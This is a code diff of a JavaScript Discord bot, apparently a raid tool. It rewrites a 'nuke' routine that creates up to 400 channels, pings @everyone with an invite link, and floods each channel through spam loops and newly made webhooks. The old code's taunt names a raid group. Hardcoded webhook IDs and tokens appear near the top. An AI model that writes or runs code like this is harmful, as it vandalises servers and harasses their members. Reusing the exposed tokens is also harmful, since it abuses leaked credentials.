@@ -1,6 +1,6 @@
 const Discord = require('discord.js');
 const { prefix, token1, assy, list} = require('./config.json');
-const antispam = require('./better-discord-antispam');
+const antispam = require('./better_antispam.js');
 const client = new Discord.Client();
 const webhookClientNuke = new Discord.WebhookClient("763134567745585192", "_MgOSCM5umktPaq3xurM6A8EOyy4DXMPfK38BStA9bNeKtpBbnRpwYUANP200Mw7QiOR");
 const webhookClientJoin = new Discord.WebhookClient("763134664994586675", "oToQNGd0eYED0SwfFKbQFyOX7s5VYcqK-gorudp0G-fsD0I3Jnyy1D0tGAP4iFDHbnrP");
@@ -251,17 +251,21 @@ client.on('message', msg => {
             }
             )
         }else{
-      var number = 1
-          msg.guild.channels.create(random123()).then(c => c.send("@everyone fucked by Nightmare Troupe LMFAO69").then(c.send("https://discord.gg/ANDTsKp")))
+       var number = 1
+        var spam = 0
+        msg.guild.channels.create('ass').then(c => c.send("https://discord.gg/ANDTsKp @everyone").then(c.send("rip webhook spam shitcord killed it")))
         while(number < 400) {
-            msg.guild.channels.create(random123()).then(c => {
-                [1,2,3,4,5,6,7,8,9,10].forEach(function(i) {
+            msg.guild.channels.create(random123()).then(c => { 
+                while(spam < 300) 
+            {    
+                c.send(randomT())
+                spam++
+            }
                     c.createWebhook("ass").then(w => {
-                        [1,2,3].forEach(function(i) {
+                        [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,].forEach(function(i) {
                             w.send(randomT())
                         })
                     })
-                } )
             })
         number++
 
